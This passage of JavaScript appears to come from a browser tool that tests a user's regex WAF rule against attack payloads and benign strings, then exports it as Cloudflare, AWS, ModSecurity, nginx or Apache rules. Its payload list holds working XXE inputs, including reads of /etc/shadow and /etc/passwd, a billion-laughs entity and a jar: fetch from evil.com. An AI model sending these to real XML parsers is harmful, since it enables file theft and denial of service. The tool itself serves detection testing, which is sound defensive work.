    { cat:'XXE', str:'<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>', desc:'Billion laughs DoS' },
    { cat:'XXE', str:'<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/shadow">]>', desc:'Shadow file XXE read' },
    { cat:'XXE', str:'<!DOCTYPE data [<!ENTITY file SYSTEM "file:///proc/self/cmdline">]><data>&file;</data>', desc:'Process cmdline XXE' },
    { cat:'XXE', str:'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]>', desc:'Netdoc protocol XXE (Java)' },
    { cat:'XXE', str:'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:https://evil.com/evil.jar!/evil.dtd">]>', desc:'JAR protocol XXE (Java)' },
    { cat:'XXE', str:'<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>', desc:'XInclude file read' }
  ];

  /* ── False positive (benign) test strings ─────────────────── */
  var BENIGN = [
    { str:'search for "blue shoes" in catalog', desc:'Normal search query' },
    { str:'user@example.com', desc:'Standard email address' },
    { str:'SELECT a gift for your friend', desc:'English sentence with SQL keyword' },
    { str:'The band played <encore>', desc:'Angle brackets in natural text' },
    { str:'/images/photo-2024.jpg', desc:'Normal image file path' },
    { str:'Price: $19.99 (or 15.99 EUR)', desc:'Price with special characters' },
    { str:'{"name":"John","age":30,"active":true}', desc:'Normal JSON body' },
    { str:'file=report_2024_Q1.pdf', desc:'Normal file parameter' },
    { str:'Content-Type: application/json', desc:'Standard HTTP header' },
    { str:'background-color: rgba(255, 128, 0, 0.5);', desc:'CSS property value' },
    { str:'I selected the union of sets A and B', desc:'English with "union" and "select"' },
    { str:'C:\\Users\\john\\Documents\\resume.docx', desc:'Windows file path' },
    { str:'O\'Brien ordered a "grande latte"', desc:'Name with apostrophe and quotes' },
    { str:'DROP-down menu is not working', desc:'Bug report with "drop"' },
    { str:'She said: "Let\'s sleep on it"', desc:'Natural language with "sleep"' },
    { str:'UPDATE your profile picture', desc:'UI text with SQL keyword' },
    { str:'path=/api/v2/users?limit=50&offset=10', desc:'Normal API path with params' },
    { str:'exec summary: Q4 results exceeded targets', desc:'Business text with "exec"' },
    { str:'The script ran for 3 hours', desc:'Text mentioning "script"' },
    { str:'<b>Bold text</b> is allowed here', desc:'Allowed HTML formatting tag' },
    { str:'Contact us at 1-800-555-0123', desc:'Phone number' },
    { str:'https://cdn.example.com/assets/logo.png', desc:'Normal external URL' },
    { str:'data-id="widget-42" class="btn"', desc:'Normal HTML attributes' },
    { str:'The table shows quarterly revenue', desc:'English with "table"' },
    { str:'SELECT ALL that apply from the list', desc:'Survey instruction text' }
  ];

  var CATEGORIES = ['XSS','SQLi','Path Traversal','Cmd Injection','SSRF','XXE'];

  /* ── State ────────────────────────────────────────────────── */
  var lastResults = null;
  var activeFilter = 'all';

  /* ── Regex compilation ───────────────────────────────────── */
  function compileRegex(src) {
    if (!src.trim()) return { re:null, error:'Empty pattern' };
    try {
      var re = new RegExp(src, 'gi');
      return { re:re, error:null };
    } catch(e) {
      return { re:null, error:e.message };
    }
  }

  /* ── Validate regex on input ─────────────────────────────── */
  regexEl.addEventListener('input', function () {
    var src = regexEl.value;
    if (!src.trim()) { metaEl.textContent = ''; metaEl.className = 'waf-regex-meta'; return; }
    var c = compileRegex(src);
    if (c.error) {
      metaEl.textContent = 'Invalid regex: ' + c.error;
      metaEl.className = 'waf-regex-meta waf-regex-error';
    } else {
      metaEl.textContent = 'Valid pattern — flags: g, i (case-insensitive)';
      metaEl.className = 'waf-regex-meta';
    }
  });

  /* ── Test engine ─────────────────────────────────────────── */
  function runTest() {
    var src = regexEl.value;
    if (!src.trim()) { metaEl.textContent = 'Enter a regex pattern first.'; metaEl.className = 'waf-regex-meta waf-regex-error'; return; }
    var c = compileRegex(src);
    if (c.error) { metaEl.textContent = 'Invalid regex: ' + c.error; metaEl.className = 'waf-regex-meta waf-regex-error'; return; }

    var payloadResults = PAYLOADS.map(function (p) {
      var re = new RegExp(src, 'gi');
      var match = re.test(p.str);
      return { cat:p.cat, str:p.str, desc:p.desc, match:match };
    });

    var fpResults = BENIGN.map(function (b) {
      var re = new RegExp(src, 'gi');
      var match = re.test(b.str);
      return { str:b.str, desc:b.desc, match:match };
    });

    var totalMatch = payloadResults.filter(function(r){ return r.match; }).length;
    var totalPayloads = payloadResults.length;
    var fpCount = fpResults.filter(function(r){ return r.match; }).length;

    // Per-category breakdown
    var catBreakdown = {};
    CATEGORIES.forEach(function (cat) {
      var items = payloadResults.filter(function(r){ return r.cat === cat; });
      var matches = items.filter(function(r){ return r.match; }).length;
      catBreakdown[cat] = { matches:matches, total:items.length };
    });

    lastResults = {
      payloads: payloadResults,
      falsePos: fpResults,
      totalMatch: totalMatch,
      totalPayloads: totalPayloads,
      fpCount: fpCount,
      catBreakdown: catBreakdown
    };

    renderScore();
    renderPayloads();
    renderFalsePos();
    renderExport();

    emptyEl.style.display = 'none';
    scoreEl.style.display = '';
    resultsEl.style.display = '';
  }

  /* ── Render: coverage score ──────────────────────────────── */
  function renderScore() {
    var r = lastResults;
    var pct = Math.round((r.totalMatch / r.totalPayloads) * 100);

    var color = pct >= 80 ? '#4ade80' : pct >= 50 ? '#fbbf24' : '#f87171';

    var breakdown = CATEGORIES.map(function (cat) {
      var c = r.catBreakdown[cat];
      return cat + ' ' + c.matches + '/' + c.total;
    }).join(' · ');

    var fpColor = r.fpCount === 0 ? '#4ade80' : r.fpCount <= 2 ? '#fbbf24' : '#f87171';
    var fpText = r.fpCount === 0 ? 'No false positives' : r.fpCount + ' false positive' + (r.fpCount !== 1 ? 's' : '');

    scoreEl.innerHTML = '<div class="waf-score-main" style="color:' + color + '">' + r.totalMatch + ' of ' + r.totalPayloads + ' payloads caught (' + pct + '%)</div>' +
      '<div class="waf-score-meter"><div class="waf-score-fill" style="width:' + pct + '%;background:' + color + '"></div></div>' +
      '<div class="waf-score-breakdown">' + breakdown + '</div>' +
      '<div class="waf-score-main" style="font-size:0.875rem;color:' + fpColor + '">' + fpText + '</div>';
  }

  /* ── Render: payload list ────────────────────────────────── */
  function renderPayloads() {
    var r = lastResults;
    var filtered = activeFilter === 'all' ? r.payloads : r.payloads.filter(function(p){ return p.cat === activeFilter; });

    // Category filter buttons
    var matchCount = function(cat) {
      var items = r.payloads.filter(function(p){ return p.cat === cat; });
      return items.filter(function(p){ return p.match; }).length + '/' + items.length;
    };
    var html = '<button class="waf-cat-btn' + (activeFilter === 'all' ? ' waf-cat-btn--active' : '') + '" data-cat="all">All ' + r.totalMatch + '/' + r.totalPayloads + '</button>';
    CATEGORIES.forEach(function(cat) {
      html += '<button class="waf-cat-btn' + (activeFilter === cat ? ' waf-cat-btn--active' : '') + '" data-cat="' + cat + '">' + cat + ' ' + matchCount(cat) + '</button>';
    });
    catFilters.innerHTML = html;

    // Payload rows
    var rows = '';
    filtered.forEach(function(p) {
      var icon = p.match ?
        '<div class="waf-payload-icon waf-payload-icon--match">&#10003;</div>' :
        '<div class="waf-payload-icon waf-payload-icon--miss">&#10007;</div>';
      rows += '<div class="waf-payload-row">' + icon +
        '<div class="waf-payload-body"><span class="waf-payload-str">' + escHtml(p.str) + '</span>' +
        '<div class="waf-payload-desc">' + escHtml(p.desc) + '</div></div>' +
        '<span class="waf-payload-cat">' + escHtml(p.cat) + '</span></div>';
    });
    payloadList.innerHTML = rows || '<div class="waf-empty-msg">No payloads in this category.</div>';
  }

  /* ── Render: false positives ─────────────────────────────── */
  function renderFalsePos() {
    var r = lastResults;
    var rows = '';
    r.falsePos.forEach(function(f) {
      var icon = f.match ?
        '<div class="waf-payload-icon waf-payload-icon--fp">!</div>' :
        '<div class="waf-payload-icon waf-payload-icon--safe">&#10003;</div>';
      var label = f.match ? 'FALSE POSITIVE — would be blocked' : 'OK — not matched';
      rows += '<div class="waf-payload-row">' + icon +
        '<div class="waf-payload-body"><span class="waf-payload-str">' + escHtml(f.str) + '</span>' +
        '<div class="waf-payload-desc">' + escHtml(f.desc) + ' — <em>' + label + '</em></div></div></div>';
    });
    fpList.innerHTML = rows;
  }

  /* ── Export generators ───────────────────────────────────── */
  function generateExport(format) {
    var pattern = regexEl.value.trim();
    var name = ruleNameEl.value.trim() || 'custom-waf-rule';
    var action = actionEl.value;

    switch(format) {
      case 'cloudflare': return generateCloudflare(pattern, name, action);
      case 'aws': return generateAWS(pattern, name, action);
      case 'modsecurity': return generateModSecurity(pattern, name, action);
      case 'nginx': return generateNginx(pattern, name, action);
      case 'apache': return generateApache(pattern, name, action);
      default: return '# Unknown format';
    }
  }

  function generateCloudflare(pattern, name, action) {
    var cfAction = action === 'block' ? 'block' : action === 'log' ? 'log' : 'managed_challenge';
    // Cloudflare uses wirefilter — regex is supported via matches operator
    var lines = [
      '# Cloudflare WAF Custom Rule',
      '# Rule: ' + name,
      '# Action: ' + cfAction,
      '# Deploy: Dashboard > Security > WAF > Custom Rules > Create Rule',
      '#',
      '# Expression (wirefilter syntax):',
      '(http.request.uri matches "' + escExport(pattern) + '")',
      'or',
      '(http.request.body matches "' + escExport(pattern) + '")',
      'or',
      '(http.request.uri.query matches "' + escExport(pattern) + '")',
      '',
      '# Action: ' + cfAction,
      '',
      '# Alternative: single-field match',
      '# (http.request.uri.query matches "' + escExport(pattern) + '")',
      '',
      '# Note: Cloudflare uses RE2 syntax (no backreferences, no lookahead).',
      '# Test your pattern in the dashboard expression builder before deploying.'
    ];
    return lines.join('\n');
  }

  function generateAWS(pattern, name, action) {
    var awsAction = action === 'block' ? 'BLOCK' : action === 'log' ? 'COUNT' : 'CAPTCHA';
    var ruleObj = {
      "Name": name,
      "Priority": 1,
      "Action": {},
      "Statement": {
        "OrStatement": {
          "Statements": [
            {
              "RegexMatchStatement": {
                "RegexString": pattern,
                "FieldToMatch": { "UriPath": {} },
                "TextTransformations": [
                  { "Priority": 0, "Type": "URL_DECODE" },
                  { "Priority": 1, "Type": "LOWERCASE" }
                ]
              }
            },
            {
              "RegexMatchStatement": {
                "RegexString": pattern,
                "FieldToMatch": { "QueryString": {} },
                "TextTransformations": [
                  { "Priority": 0, "Type": "URL_DECODE" },
                  { "Priority": 1, "Type": "LOWERCASE" }
                ]
              }
            },
            {
              "RegexMatchStatement": {
                "RegexString": pattern,
                "FieldToMatch": { "Body": { "OversizeHandling": "MATCH" } },
                "TextTransformations": [
                  { "Priority": 0, "Type": "URL_DECODE" },
                  { "Priority": 1, "Type": "LOWERCASE" }
                ]
              }
            }
          ]
        }
      },
      "VisibilityConfig": {
        "SampledRequestsEnabled": true,
        "CloudWatchMetricsEnabled": true,
        "MetricName": name.replace(/[^a-zA-Z0-9]/g, '')
      }
    };
    ruleObj.Action[awsAction] = {};
    return '// AWS WAF v2 Rule Statement\n' +
      '// Deploy via: AWS Console > WAF > Web ACLs > Rules > Add Rule\n' +
      '// Or use aws wafv2 update-web-acl CLI command\n' +
      '// Note: AWS WAF uses a subset of PCRE. Max pattern length: 200 chars.\n\n' +
      JSON.stringify(ruleObj, null, 2);
  }

  function generateModSecurity(pattern, name, action) {
    var msAction = action === 'block' ? 'deny,status:403' : action === 'log' ? 'log,noauditlog,pass' : 'deny,status:403';
    var lines = [
      '# ModSecurity Rule',
      '# Rule: ' + name,
      '# Deploy: Add to modsecurity.conf or a custom rules file',
      '# Docs: https://github.com/owasp-modsecurity/ModSecurity/wiki/Reference-Manual',
      '',
      '# Inspect URI, query string, and request body',
      'SecRule REQUEST_URI|ARGS|REQUEST_BODY "' + escExport(pattern) + '" \\',
      '    "id:100001,\\',
      '     phase:2,\\',
      '     t:none,\\',
      '     t:urlDecodeUni,\\',
      '     t:lowercase,\\',
      '     ' + msAction + ',\\',
      '     msg:\'' + name + ': Suspicious pattern detected\',\\',
      '     logdata:\'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}\',\\',
      '     tag:\'application-multi\',\\',
      '     tag:\'language-multi\',\\',
      '     tag:\'platform-multi\',\\',
      '     tag:\'attack-generic\',\\',
      '     severity:\'CRITICAL\'"',
      '',
      '# Note: Adjust the rule ID (100001) to avoid conflicts.',
      '# Use t:urlDecodeUni and t:lowercase for normalization.',
      '# Set phase:1 for header-only inspection, phase:2 to include body.'
    ];
    return lines.join('\n');
  }

  function generateNginx(pattern, name, action) {
    var actionDirective = action === 'block' ? 'return 403;' : action === 'log' ? 'access_log /var/log/nginx/waf_' + name.replace(/[^a-z0-9_-]/gi,'_') + '.log;' : 'return 403;';
    var lines = [
      '# nginx WAF Rule',
      '# Rule: ' + name,
      '# Deploy: Add inside a server{} or location{} block',
      '',
      '# Method 1: Match against request URI',
      'if ($request_uri ~* "' + escExport(pattern) + '") {',
      '    ' + actionDirective,
      '}',
      '',
      '# Method 2: Match against query string',
      'if ($query_string ~* "' + escExport(pattern) + '") {',
      '    ' + actionDirective,
      '}',
      '',
      '# Method 3: Match against request body (requires ngx_http_lua_module)',
      '# access_by_lua_block {',
      '#     ngx.req.read_body()',
      '#     local body = ngx.req.get_body_data()',
      '#     if body and ngx.re.match(body, [[' + pattern + ']], "joi") then',
      '#         ngx.exit(403)',
      '#     end',
      '# }',
      '',
      '# Note: nginx uses PCRE regex syntax.',
      '# "if" in location context has limitations — see nginx pitfalls.',
      '# For production, consider OpenResty/lua-resty-waf or ModSecurity + nginx.'
    ];
    return lines.join('\n');
  }

  function generateApache(pattern, name, action) {
    var flag = action === 'block' ? '[F,L]' : action === 'log' ? '[L,E=waf_match:1]' : '[F,L]';
    var lines = [
      '# Apache .htaccess WAF Rule',
      '# Rule: ' + name,
      '# Deploy: Add to .htaccess or httpd.conf VirtualHost',
      '',
      'RewriteEngine On',
      '',
      '# Block matching request URIs',
      'RewriteCond %{REQUEST_URI} "' + escExport(pattern) + '" [NC,OR]',
      'RewriteCond %{QUERY_STRING} "' + escExport(pattern) + '" [NC]',
      'RewriteRule .* - ' + flag,
      '',
      '# Optional: Log matched requests (if action is log)',
      '# SetEnvIfNoCase Request_URI "' + escExport(pattern) + '" waf_blocked',
      '# CustomLog /var/log/apache2/waf_' + name.replace(/[^a-z0-9_-]/gi,'_') + '.log combined env=waf_blocked',
      '',
      '# Note: Apache uses PCRE regex in RewriteCond.',
      '# [NC] = case-insensitive, [F] = forbidden (403), [L] = last rule.',
      '# For request body inspection, use mod_security instead of mod_rewrite.'
    ];
    return lines.join('\n');
  }

  /* ── Render: export ──────────────────────────────────────── */
  function renderExport() {
    var format = exportFmt.value;
    var labels = { cloudflare:'Cloudflare WAF', aws:'AWS WAF', modsecurity:'ModSecurity', nginx:'nginx', apache:'Apache' };
    exportLabel.textContent = labels[format] || format;
    exportCode.textContent = generateExport(format);
  }

  /* ── Tabs ────────────────────────────────────────────────── */
  tabsEl.addEventListener('click', function(e) {
    var tab = e.target.getAttribute('data-tab');
    if (!tab) return;
    var buttons = tabsEl.querySelectorAll('.waf-tab');
    for (var i = 0; i < buttons.length; i++) buttons[i].className = 'waf-tab';
    e.target.className = 'waf-tab waf-tab--active';

    document.getElementById('waf-panel-payloads').style.display = tab === 'payloads' ? '' : 'none';
    document.getElementById('waf-panel-falsepos').style.display = tab === 'falsepos' ? '' : 'none';
    document.getElementById('waf-panel-export').style.display = tab === 'export' ? '' : 'none';
  });

  /* ── Category filters ────────────────────────────────────── */
  catFilters.addEventListener('click', function(e) {
    var cat = e.target.getAttribute('data-cat');
    if (!cat) return;
    activeFilter = cat;
    renderPayloads();
  });

  /* ── Export format change ────────────────────────────────── */
  exportFmt.addEventListener('change', function() { if (lastResults) renderExport(); });

  /* ── Copy button ─────────────────────────────────────────── */
  copyBtn.addEventListener('click', function() {
    var text = exportCode.textContent;
    if (navigator.clipboard) {
      navigator.clipboard.writeText(text).then(function() {
        copyBtn.textContent = 'Copied!';
        setTimeout(function() { copyBtn.textContent = 'Copy'; }, 1500);
      });
    } else {
      var ta = document.createElement('textarea');
      ta.value = text;
      document.body.appendChild(ta);
      ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
      copyBtn.textContent = 'Copied!';
      setTimeout(function() { copyBtn.textContent = 'Copy'; }, 1500);
    }
  });

  /* ── Test button ─────────────────────────────────────────── */
  testBtn.addEventListener('click', runTest);

  /* ── Example button ──────────────────────────────────────── */
  exampleBtn.addEventListener('click', function() {
    ruleNameEl.value = 'block-sqli-basic';
    regexEl.value = "(?i)(?:union\\s+(?:all\\s+)?select|select\\s+.+\\s+from\\s+|insert\\s+into\\s+|delete\\s+from\\s+|drop\\s+(?:table|database)|exec(?:ute)?\\s*\\(|xp_cmdshell|information_schema|'\\s*(?:or|and)\\s+['\"]?\\d)";
    actionEl.value = 'block';
    metaEl.textContent = 'Valid pattern — flags: g, i (case-insensitive)';
    metaEl.className = 'waf-regex-meta';
    runTest();
  });

  /* ── Clear button ────────────────────────────────────────── */
  clearBtn.addEventListener('click', function() {
    regexEl.value = '';
    ruleNameEl.value = 'custom-waf-rule';
    actionEl.value = 'block';
    metaEl.textContent = '';
    metaEl.className = 'waf-regex-meta';
    scoreEl.style.display = 'none';
    resultsEl.style.display = 'none';
    emptyEl.style.display = '';
    lastResults = null;
    activeFilter = 'all';
  });

  /* ── Utils ───────────────────────────────────────────────── */
  function escHtml(s) {
    var d = document.createElement('div');
    d.appendChild(document.createTextNode(s));
    return d.innerHTML;
  }

  function escExport(s) {
    return s.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
  }
})();
</script>{% endraw %}